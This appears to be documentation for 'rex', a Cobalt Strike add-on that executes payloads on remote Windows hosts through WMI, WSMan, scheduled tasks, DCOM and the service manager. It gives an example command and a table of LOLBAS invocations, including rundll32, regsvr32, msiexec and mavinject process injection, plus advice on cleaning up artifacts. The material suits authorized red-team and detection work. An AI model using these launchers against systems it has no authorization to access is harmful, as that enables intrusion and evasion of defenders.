# Launcher contracts

The Cobalt Strike integration provides launchers for `wmi-exec`, `wsman-exec`,
`task-sched-exec`, `dcom-ishell-dispatch2`, and `scm-command`. Choose a payload type, launcher,
and absolute path to a file already on the target.

```text
rex launchers
rex wmi-exec --target 10.0.0.15 --payload-type dll \
  --remote-path C:\ProgramData\loader.dll \
  --launcher rundll32.exe --entry-point Run
```

Selectors containing spaces or parentheses must be quoted.

## Documentation

- [Authoring and validation](authoring.md)
- [Native DLL launchers](native.md)
- [Control Panel modules](cpl.md)
- [Managed .NET launchers](managed.md)
- [Process-bound injection](injection.md)
- [Custom launchers](custom.md)

## Built-in selectors

| Selector | Payload | Resolved invocation | Required payload contract | LOLBAS |
| --- | --- | --- | --- | --- |
| `rundll32.exe` | `dll` | `rundll32.exe REMOTE_PATH,ENTRY_POINT` | Export named by required `--entry-point` | [Rundll32](https://lolbas-project.github.io/lolbas/Binaries/Rundll32/) |
| `rundll32.exe (advpack RegisterOCX)` | `dll` | `rundll32.exe advpack.dll,RegisterOCX REMOTE_PATH` | `DllRegisterServer` | [Advpack](https://lolbas-project.github.io/lolbas/Libraries/Advpack/) |
| `msiexec.exe (/y)` | `dll` | `msiexec.exe /y REMOTE_PATH` | `DllRegisterServer` | [Msiexec](https://lolbas-project.github.io/lolbas/Binaries/Msiexec/) |
| `msiexec.exe (/z)` | `dll` | `msiexec.exe /z REMOTE_PATH` | `DllUnregisterServer` | [Msiexec](https://lolbas-project.github.io/lolbas/Binaries/Msiexec/) |
| `odbcconf.exe` | `dll` | `odbcconf.exe /a {REGSVR REMOTE_PATH}` | `DllRegisterServer` | [Odbcconf](https://lolbas-project.github.io/lolbas/Binaries/Odbcconf/) |
| `regsvr32.exe` | `dll` | `regsvr32.exe /s REMOTE_PATH` | `DllRegisterServer` | [Regsvr32](https://lolbas-project.github.io/lolbas/Binaries/Regsvr32/) |
| `regsvr32.exe (/u)` | `dll` | `regsvr32.exe /s /u REMOTE_PATH` | `DllUnregisterServer` | [Regsvr32](https://lolbas-project.github.io/lolbas/Binaries/Regsvr32/) |
| `regsvr32.exe (/i)` | `dll` | `regsvr32.exe /s /n /i REMOTE_PATH` | `DllInstall(TRUE, ...)` | [Regsvr32](https://lolbas-project.github.io/lolbas/Binaries/Regsvr32/) |
| `regsvr32.exe (/u /i)` | `dll` | `regsvr32.exe /s /u /n /i REMOTE_PATH` | `DllInstall(FALSE, ...)` | [Regsvr32](https://lolbas-project.github.io/lolbas/Binaries/Regsvr32/) |
| `control.exe` | `cpl` | `control.exe REMOTE_PATH` | Control Panel module exporting `CPlApplet` | [Control](https://lolbas-project.github.io/lolbas/Binaries/Control/) |
| `mavinject.exe` | `dll` | `mavinject.exe PROCESS_ID /INJECTRUNNING REMOTE_PATH` | Native DLL compatible with `--process-id` | [Mavinject](https://lolbas-project.github.io/lolbas/Binaries/Mavinject/) |
| `RegAsm.exe`, `RegAsm.exe (/U)` | `managed` | Framework64 `RegAsm.exe [/U] REMOTE_PATH` | COM-visible managed registration callbacks | [Regasm](https://lolbas-project.github.io/lolbas/Binaries/Regasm/) |
| `RegSvcs.exe`, `RegSvcs.exe (/U)` | `managed` | Framework64 `RegSvcs.exe [/U] REMOTE_PATH` | Strong-named Enterprise Services component | [Regsvcs](https://lolbas-project.github.io/lolbas/Binaries/Regsvcs/) |
| `InstallUtil.exe`, `InstallUtil.exe (/U)` | `managed` | Framework64 `InstallUtil.exe ... [/U] REMOTE_PATH` | Public `[RunInstaller(true)]` installer | [Installutil](https://lolbas-project.github.io/lolbas/Binaries/Installutil/) |

`--entry-point` is required only by standard `rundll32.exe` and custom
templates that contain `{entry_point}`. `mavinject.exe` and custom templates
that contain `{process_id}` require `--process-id`. `--launcher-program` may
override a built-in executable path, for example to select a 32-bit .NET
Framework tool or a `SysWOW64` launcher.

## Invocation format

The CNA resolves a launcher into a program and arguments before the BOF runs.
`wmi-exec` receives one command line. `wsman-exec`, `task-sched-exec`, and
`dcom-ishell-dispatch2` receive separate program and argument values. `scm-command`
receives the same complete command-line form as `wmi-exec`.

`rex preflight` checks the remote-execution technique, not the launcher or
payload. Verify file presence, architecture, exports, dependencies, and process
IDs before execution.

## Results and cleanup

`wmi-exec`, `task-sched-exec`, `dcom-ishell-dispatch2`, and `scm-command` return after starting
the launcher. `wsman-exec` waits for its exit code.

Delete the remote file after the launcher exits. Clean up files, registry keys,
services, tasks, or other state created by the payload separately.
